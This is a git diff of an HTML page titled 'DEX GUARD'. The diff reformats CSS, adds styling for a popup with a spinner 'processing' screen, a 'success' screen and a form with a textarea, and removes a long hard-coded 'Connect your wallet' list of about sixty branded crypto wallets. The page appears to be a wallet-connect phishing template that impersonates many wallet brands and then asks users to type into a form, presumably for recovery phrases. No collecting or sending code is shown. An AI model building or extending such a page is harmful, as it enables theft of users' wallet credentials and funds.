@@ -12,7 +12,6 @@
 
 <title>DEX GUARD</title>
 
-
 <style>
 
 /* =====================================================
@@ -25,18 +24,13 @@
     box-sizing: border-box;
 }
 
-
 html {
     scroll-behavior: smooth;
 }
 
-
 body {
-
     width: 100%;
-
     min-height: 100vh;
-
     overflow-x: hidden;
 
     font-family:
@@ -45,7 +39,6 @@ body {
         sans-serif;
 
     color: white;
-
     background: #080909;
 }
 
@@ -55,24 +48,19 @@ body {
 ===================================================== */
 
 :root {
-
     --blue: #64ddff;
-
     --blue-light: #a5efff;
-
     --blue-dark: #18bfe7;
 
     --background: #090a0b;
-
     --card: #111213;
 
     --text-gray: #888d90;
-
 }
 
 
 /* =====================================================
-   DARK BACKGROUND IMAGE
+   BACKGROUND
 ===================================================== */
 
 body::before {
@@ -101,7 +89,6 @@ body::before {
     background-repeat: no-repeat;
 
     filter: brightness(0.42);
-
 }
 
 
@@ -127,13 +114,12 @@ body::before {
     border-bottom:
         1px solid
         rgba(255,255,255,0.04);
-
 }
 
 
 .logo {
 
-    width:170px;
+    width: 170px;
 
     height: auto;
 
@@ -142,114 +128,639 @@ body::before {
 
 
 /* =====================================================
-   WALLET SECTION & MODAL STYLES
+   WALLET SECTION
 ===================================================== */
 
 .wallet-section {
+
     width: 100%;
-    min-height: calc(100vh - 52px - 350px);
+
+    min-height:
+        calc(100vh - 52px - 350px);
+
     display: flex;
+
     justify-content: center;
+
     align-items: flex-start;
-    padding: 30px 15px 50px;
+
+    padding:
+        30px 15px 50px;
 }
+
+
+/* =====================================================
+   WALLET MODAL CARD
+===================================================== */
 
 .wallet-modal {
+
     width: 100%;
+
     max-width: 620px;
+
     background: #151719;
-    border: 1px solid rgba(255, 255, 255, 0.1);
+
+    border:
+        1px solid
+        rgba(255,255,255,0.1);
+
     border-radius: 12px;
-    padding: 24px 20px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+
+    padding:
+        24px 20px;
+
+    box-shadow:
+        0 10px 30px
+        rgba(0,0,0,0.5);
 }
 
+
 .modal-title {
+
     font-size: 18px;
+
     font-weight: 700;
+
     color: #ffffff;
+
     margin-bottom: 20px;
 }
 
-/* Mobile height: shows 6 items in 1 column */
+
+/* =====================================================
+   WALLET LIST
+===================================================== */
+
 .wallet-list-container {
+
     max-height: 290px;
+
     overflow-y: auto;
+
     padding-right: 6px;
 }
 
-/* Custom Scrollbar Styling */
+
 .wallet-list-container::-webkit-scrollbar {
     width: 6px;
 }
 
+
 .wallet-list-container::-webkit-scrollbar-track {
-    background: rgba(255, 255, 255, 0.05);
+
+    background:
+        rgba(255,255,255,0.05);
+
     border-radius: 3px;
 }
+
 
 .wallet-list-container::-webkit-scrollbar-thumb {
-    background: rgba(255, 255, 255, 0.2);
+
+    background:
+        rgba(255,255,255,0.2);
+
     border-radius: 3px;
 }
 
+
 .wallet-list-container::-webkit-scrollbar-thumb:hover {
-    background: var(--blue);
+
+    background:
+        var(--blue);
 }
 
-/* Default Mobile Layout: Single Column */
+
+/* =====================================================
+   WALLET GRID
+===================================================== */
+
 .wallet-grid {
+
     display: grid;
+
     grid-template-columns: 1fr;
+
     gap: 10px;
 }
 
+
+/* =====================================================
+   WALLET ITEM
+===================================================== */
+
 .wallet-item {
+
+    width: 100%;
+
     display: flex;
+
     align-items: center;
+
     justify-content: space-between;
+
     background: #ffffff;
+
+    border: none;
+
     border-radius: 8px;
+
     padding: 10px 14px;
+
     text-decoration: none;
-    transition: transform 0.15s ease, box-shadow 0.15s ease;
+
+    cursor: pointer;
+
+    transition:
+        transform 0.15s ease,
+        box-shadow 0.15s ease;
 }
+
 
 .wallet-item:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 4px 12px rgba(100, 221, 255, 0.2);
+
+    transform:
+        translateY(-2px);
+
+    box-shadow:
+        0 4px 12px
+        rgba(100,221,255,0.2);
 }
 
+
+.wallet-item:active {
+
+    transform:
+        scale(0.98);
+}
+
+
 .wallet-item-left {
+
     display: flex;
+
     align-items: center;
+
     gap: 8px;
+
     overflow: hidden;
 }
 
+
 .wallet-dot {
+
     width: 7px;
+
     height: 7px;
+
     border-radius: 50%;
-    background-color: #ffd700;
+
+    background-color:
+        #ffd700;
+
     flex-shrink: 0;
 }
 
+
 .wallet-name {
+
     color: #000000;
+
     font-size: 13px;
+
     font-weight: 700;
+
     white-space: nowrap;
+
     overflow: hidden;
+
     text-overflow: ellipsis;
 }
 
+
 .wallet-logo {
+
     width: 22px;
+
     height: 22px;
+
     object-fit: contain;
+
     flex-shrink: 0;
+
     border-radius: 4px;
+}
+
+
+/* =====================================================
+   POPUP OVERLAY
+===================================================== */
+
+.popup-overlay {
+
+    position: fixed;
+
+    inset: 0;
+
+    z-index: 1000;
+
+    display: none;
+
+    align-items: center;
+
+    justify-content: center;
+
+    padding: 20px;
+
+    background:
+        rgba(0,0,0,0.78);
+
+    backdrop-filter:
+        blur(5px);
+}
+
+
+.popup-overlay.active {
+
+    display: flex;
+
+    animation:
+        fadeIn 0.2s ease;
+}
+
+
+@keyframes fadeIn {
+
+    from {
+        opacity: 0;
+    }
+
+    to {
+        opacity: 1;
+    }
+}
+
+
+/* =====================================================
+   POPUP BOX
+===================================================== */
+
+.popup {
+
+    position: relative;
+
+    width: 100%;
+
+    max-width: 420px;
+
+    background: #151719;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.12);
+
+    border-radius: 16px;
+
+    padding: 30px 24px;
+
+    text-align: center;
+
+    box-shadow:
+        0 20px 60px
+        rgba(0,0,0,0.65);
+
+    animation:
+        popupUp 0.25s ease;
+}
+
+
+@keyframes popupUp {
+
+    from {
+
+        opacity: 0;
+
+        transform:
+            translateY(15px)
+            scale(0.97);
+    }
+
+    to {
+
+        opacity: 1;
+
+        transform:
+            translateY(0)
+            scale(1);
+    }
+}
+
+
+/* =====================================================
+   CLOSE BUTTON
+===================================================== */
+
+.close-popup {
+
+    position: absolute;
+
+    top: 12px;
+
+    right: 14px;
+
+    width: 32px;
+
+    height: 32px;
+
+    border: none;
+
+    border-radius: 50%;
+
+    background:
+        rgba(255,255,255,0.07);
+
+    color: #ffffff;
+
+    font-size: 20px;
+
+    line-height: 32px;
+
+    cursor: pointer;
+
+    transition:
+        background 0.2s ease;
+}
+
+
+.close-popup:hover {
+
+    background:
+        rgba(255,255,255,0.15);
+}
+
+
+/* =====================================================
+   PROCESSING SCREEN
+===================================================== */
+
+.processing-screen {
+
+    display: block;
+}
+
+
+.processing-icon {
+
+    width: 58px;
+
+    height: 58px;
+
+    margin:
+        5px auto 20px;
+
+    border:
+        4px solid
+        rgba(100,221,255,0.15);
+
+    border-top:
+        4px solid
+        var(--blue);
+
+    border-radius: 50%;
+
+    animation:
+        spin 0.9s linear infinite;
+}
+
+
+@keyframes spin {
+
+    to {
+        transform:
+            rotate(360deg);
+    }
+}
+
+
+.processing-title {
+
+    font-size: 20px;
+
+    color: #ffffff;
+
+    margin-bottom: 10px;
+}
+
+
+.processing-text {
+
+    color: #888d90;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+}
+
+
+/* =====================================================
+   SUCCESS SCREEN
+===================================================== */
+
+.success-screen {
+
+    display: none;
+}
+
+
+.selected-wallet-logo {
+
+    width: 65px;
+
+    height: 65px;
+
+    object-fit: contain;
+
+    margin:
+        5px auto 15px;
+
+    border-radius: 10px;
+}
+
+
+.success-title {
+
+    color: #ffffff;
+
+    font-size: 20px;
+
+    line-height: 1.4;
+
+    margin-bottom: 8px;
+}
+
+
+.success-title span {
+
+    color:
+        var(--blue);
+}
+
+
+.success-text {
+
+    color: #888d90;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+
+    margin-bottom: 22px;
+}
+
+
+/* =====================================================
+   FORM
+===================================================== */
+
+.wallet-form {
+
+    width: 100%;
+
+    text-align: left;
+}
+
+
+.form-label {
+
+    display: block;
+
+    color: #cfd2d3;
+
+    font-size: 12px;
+
+    margin-bottom: 7px;
+}
+
+
+.form-input,
+.form-textarea {
+
+    width: 100%;
+
+    border:
+        1px solid
+        rgba(255,255,255,0.12);
+
+    background:
+        #0d0f10;
+
+    color: #ffffff;
+
+    border-radius: 8px;
+
+    outline: none;
+
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    font-size: 13px;
+
+    transition:
+        border 0.2s ease;
+}
+
+
+.form-input {
+
+    height: 44px;
+
+    padding:
+        0 13px;
+
+    margin-bottom: 15px;
+}
+
+
+.form-textarea {
+
+    min-height: 90px;
+
+    resize: vertical;
+
+    padding: 12px;
+
+    margin-bottom: 15px;
+}
+
+
+.form-input:focus,
+.form-textarea:focus {
+
+    border-color:
+        var(--blue);
+}
+
+
+.submit-button {
+
+    width: 100%;
+
+    height: 45px;
+
+    border: none;
+
+    border-radius: 8px;
+
+    background:
+        var(--blue);
+
+    color: #061014;
+
+    font-size: 14px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+
+    transition:
+        background 0.2s ease,
+        transform 0.15s ease;
+}
+
+
+.submit-button:hover {
+
+    background:
+        var(--blue-light);
+}
+
+
+.submit-button:active {
+
+    transform:
+        scale(0.98);
+}
+
+
+/* =====================================================
+   FORM SUCCESS
+===================================================== */
+
+.form-message {
+
+    display: none;
+
+    margin-top: 15px;
+
+    color:
+        var(--blue);
+
+    font-size: 13px;
+
+    line-height: 1.5;
 }
 
 
@@ -284,10 +795,6 @@ body::before {
 }
 
 
-/* =====================================================
-   FOOTER LOGO
-===================================================== */
-
 .footer-logo {
 
     width: 150px;
@@ -299,10 +806,6 @@ body::before {
     margin-bottom: 28px;
 }
 
-
-/* =====================================================
-   FOOTER DIVIDER
-===================================================== */
 
 .footer-divider {
 
@@ -317,10 +820,6 @@ body::before {
 }
 
 
-/* =====================================================
-   PRIVACY TITLE
-===================================================== */
-
 .footer h2 {
 
     color: #ffffff;
@@ -332,10 +831,6 @@ body::before {
     margin-bottom: 12px;
 }
 
-
-/* =====================================================
-   PRIVACY TEXT
-===================================================== */
 
 .footer p {
 
@@ -349,21 +844,14 @@ body::before {
 }
 
 
-/* =====================================================
-   THANK YOU
-===================================================== */
-
 .thank-you {
 
     margin-top: 8px;
 
-    color: #9a9d9f !important;
+    color:
+        #9a9d9f !important;
 }
 
-
-/* =====================================================
-   COPYRIGHT
-===================================================== */
 
 .copyright {
 
@@ -371,9 +859,11 @@ body::before {
 
     margin-bottom: 0 !important;
 
-    color: #888b8d !important;
+    color:
+        #888b8d !important;
 
-    font-size: 10px !important;
+    font-size:
+        10px !important;
 }
 
 
@@ -385,38 +875,69 @@ body::before {
 
 
 /* =====================================================
-   DESKTOP RESPONSIVE BREAKPOINT
+   DESKTOP
 ===================================================== */
 
 @media (min-width: 700px) {
 
     .wallet-grid {
-        grid-template-columns: repeat(3, 1fr);
+
+        grid-template-columns:
+            repeat(3, 1fr);
     }
 
-    /* Shows 6 rows (18 items total) at a time on desktop before scrolling */
     .wallet-list-container {
+
         max-height: 310px;
     }
 
     .wallet-name {
+
         font-size: 11px;
     }
 
     .wallet-logo {
+
         width: 20px;
+
         height: 20px;
     }
 
     .wallet-item {
-        padding: 8px 10px;
+
+        padding:
+            8px 10px;
     }
 
     .footer-inner {
 
         max-width: 1200px;
     }
+}
 
+
+/* =====================================================
+   SMALL MOBILE
+===================================================== */
+
+@media (max-width: 380px) {
+
+    .wallet-modal {
+
+        padding:
+            20px 15px;
+    }
+
+    .popup {
+
+        padding:
+            28px 18px;
+    }
+
+    .success-title {
+
+        font-size: 18px;
+    }
 }
 
 </style>
@@ -426,6 +947,10 @@ body::before {
 
 <body>
 
+
+<!-- =====================================================
+     HEADER
+===================================================== -->
 
 <header class="header">
 
@@ -442,631 +967,184 @@ body::before {
 </header>
 
 
+
+<!-- =====================================================
+     WALLET SECTION
+===================================================== -->
+
 <section class="wallet-section">
 
     <div class="wallet-modal">
-        <h2 class="modal-title">Connect your wallet</h2>
-        
+
+        <h2 class="modal-title">
+            Connect your wallet
+        </h2>
+
+
         <div class="wallet-list-container">
-            <div class="wallet-grid">
 
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Metamask</span>
-                    </div>
-                    <img src="pictures/metamask.png" alt="Metamask" class="wallet-logo">
-                </a>
+            <div class="wallet-grid" id="walletGrid">
 
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Trust</span>
-                    </div>
-                    <img src="pictures/trust.png" alt="Trust" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Coinbase</span>
-                    </div>
-                    <img src="pictures/Coinbase .png" alt="Coinbase" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Kukai</span>
-                    </div>
-                    <img src="pictures/Kukai.png" alt="Kukai" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Cardano</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/975/small/cardano.png" alt="Cardano" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Dero Wallet</span>
-                    </div>
-                    <img src="pictures/Derowallet.png" alt="Dero Wallet" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Yoroi</span>
-                    </div>
-                    <img src="pictures/Yoroi.png" alt="Yoroi" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">CCVault</span>
-                    </div>
-                    <img src="pictures/Ccvault.jpg" alt="CCVault" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Gero</span>
-                    </div>
-                    <img src="pictures/Gero.png" alt="Gero" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Nami</span>
-                    </div>
-                    <img src="pictures/Nami.png" alt="Nami" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Solana</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Solana" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Phantom</span>
-                    </div>
-                    <img src="pictures/Phantom.jpg" alt="Phantom" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Solflare</span>
-                    </div>
-                    <img src="pictures/solflare.png" alt="Solflare" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Sollet</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Sollet" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Solong</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="Solong" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Exodus</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Exodus" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Avalanche</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png" alt="Avalanche" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Velas</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/9622/small/Velas.png" alt="Velas" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">crypto.com</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/7310/small/cronos.png" alt="crypto.com" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Blockchain</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Blockchain" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Binance Smart</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="Binance Smart" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Safepal</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/13904/small/SFP.png" alt="Safepal" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Raydium</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/13928/small/raydium.png" alt="Raydium" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Torus</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Torus" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">MathWallet</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/10708/small/math.png" alt="MathWallet" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Keyring Pro</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Keyring Pro" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">BitKeep</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="BitKeep" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">SparkPoint</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/7928/small/SRK_logo.png" alt="SparkPoint" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">OwnBit</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="OwnBit" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Infinity Wallet</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Infinity Wallet" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">WalletConnect</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="WalletConnect" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Infinity</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Infinity" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">TokenPocket</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/11883/small/TP_logo.png" alt="TokenPocket" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Nash</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/8051/small/NEX.png" alt="Nash" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">BitPay</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="BitPay" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">imToken</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="imToken" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Peritas</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Peritas" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">ParaSwap</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/20403/small/psp.png" alt="ParaSwap" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Bity</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="Bity" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Defiat</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/12250/small/DFT.png" alt="Defiat" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Crossmint</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Crossmint" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Zelcore</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/5039/small/flux.png" alt="Zelcore" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Freespace</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Freespace" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">OneKey</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="OneKey" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Ledge</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Ledge" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Tezos</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/976/small/Tezos-logo-Symbol-PNG.png" alt="Tezos" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Neobeats</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Neobeats" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Dockery</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Dockery" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Paper</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Paper" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Plair</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/6835/small/PLA.png" alt="Plair" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Proton</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/11100/small/XPR.png" alt="Proton" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Rico</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Rico" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Betterment</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Betterment" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Strax</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/533/small/stratis.png" alt="Strax" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Sequence</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Sequence" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Tubetomy</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Tubetomy" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Zelpays</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Zelpays" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Vanity</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/15873/small/Vanity.png" alt="Vanity" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Verso</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/15004/small/VSO_Icon_200.png" alt="Verso" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Wallet3</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="Wallet3" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Polkadot</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/12171/small/polkadot.png" alt="Polkadot" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Phantasma</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/4382/small/Phantasma.png" alt="Phantasma" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
-                        <span class="wallet-name">Filecoin</span>
-                    </div>
-                    <img src="https://assets.coingecko.com/coins/images/12817/small/filecoin.png" alt="Filecoin" class="wallet-logo">
-                </a>
-
-                <a href="index.html" class="wallet-item">
-                    <div class="wallet-item-left">
-                        <span class="wallet-dot"></span>
